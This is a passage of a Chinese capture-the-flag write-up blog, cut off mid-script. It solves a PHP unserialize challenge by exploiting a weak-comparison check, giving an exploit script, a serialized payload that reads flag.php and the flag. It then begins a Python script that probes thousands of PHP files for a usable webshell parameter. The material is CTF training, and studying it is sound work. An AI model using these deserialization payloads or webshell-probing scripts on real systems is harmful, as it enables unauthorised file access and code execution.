class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Too long!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Successful!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$res</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"[Result]: &lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">op</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">op</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">content</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">125</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">&#123;</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>先看FileHandler类，这里在构造时默认设置为写操作会调用process，process函数会根据op属性的值来调用write、read、output等函数。跟进到这三个函数，write函数要求content属性的长度不能超过100，然后把content写入到filename文件中。read函数就是从filename文件中读取内容。output函数是一个普通的字符串输出函数。在类对象销毁时会判断op是否为2，如果是就重置为1，然后把文件清空。</p>\n<p>然后看一下合法性验证函数，这里主要是输入的字符必须是可显示字符。</p>\n<p>通过str传参进去，只要通过验证就会做反序列化操作。</p>\n<p>注意到析构函数使用的是一个===的强类型比较，而在process函数中的则是使用的==弱类型的比较，所以我们只要把op设置为一个整数的2就可以绕过这个限制了。</p>\n<p>利用php7.1+版本对属性类型不敏感，我们可以直接把protect改成public来构造payload，因为protect类型序列化会产生一个%00的不可显示字符，这样就字符串非法了。</p>\n<p>exp：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FileHandler</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$op</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$op</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Hello World!\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">op</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Bad Hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Too long!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Successful!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">else</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Failed!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$res</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function\">output</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"[Result]: &lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">op</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">op</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">content</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">125</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_valid</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>flag在源码里：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201025164844705.png\" alt=\"image-20201025164844705\"></p>\n<p>flag{6de9f1d8-d286-4269-bfc9-41943f06b108}</p>\n<h2 id=\"强网杯-2019-高明的黑客\"><a href=\"#强网杯-2019-高明的黑客\" class=\"headerlink\" title=\"[强网杯 2019]高明的黑客\"></a>[强网杯 2019]高明的黑客</h2><p>考点：程序编写</p>\n<p>下载<a href=\"http://www.tar.gz文件,解压后是很多php文件,居然有3000多个,这题肯定不是让我们审计代码,这看到猴年马月./\">www.tar.gz文件,解压后是很多php文件，居然有3000多个，这题肯定不是让我们审计代码，这看到猴年马月。</a></p>\n<p>随便开一个看看，发现里面乱七八糟的，但是有一些很像是一句话木马的语句。难道是要我们去找webshell在那个文件里面吗？</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">import</span> threading\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"开始时间:    \"</span> <span class=\"token operator\">+</span> time<span class=\"token punctuation\">.</span>asctime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ns1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Semaphore<span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span>\nfilePath <span class=\"token operator\">=</span> <span class=\"token string\">\"F:/SoftWare/phpstudy_pro/WWW/src/\"</span>\nos<span class=\"token punctuation\">.</span>chdir<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">)</span>\nrequests<span class=\"token punctuation\">.</span>adapters<span class=\"token punctuation\">.</span>DEFAULT_RETRIES <span class=\"token operator\">=</span> <span class=\"token number\">5</span>\nfiles <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">)</span>\nsession <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsession<span class=\"token punctuation\">.</span>keep_alive <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_content</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    s1<span class=\"token punctuation\">.</span>acquire<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"尝试 \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">file</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"    \"</span> <span class=\"token operator\">+</span> time<span class=\"token punctuation\">.</span>asctime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>localtime<span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span> encoding<span class=\"token operator\">=</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        gets <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        posts <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">'\\$_POST\\[\\'(.*?)\\'\\]'</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n        params <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">for</span> m <span class=\"token keyword\">in</span> gets<span class=\"token punctuation\">:</span>\n            params<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"echo 'A1andNS';\"</span>\n        <span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> posts<span class=\"token punctuation\">:</span>\n            data<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"echo A1andNS;\"</span>\n        url <span class=\"token operator\">=</span> <span class=\"token string\">'http://src/'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">file</span>\n        r <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> params<span class=\"token operator\">=</span>params<span class=\"token punctuation\">)</span>\n        r<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        r<span class=\"token 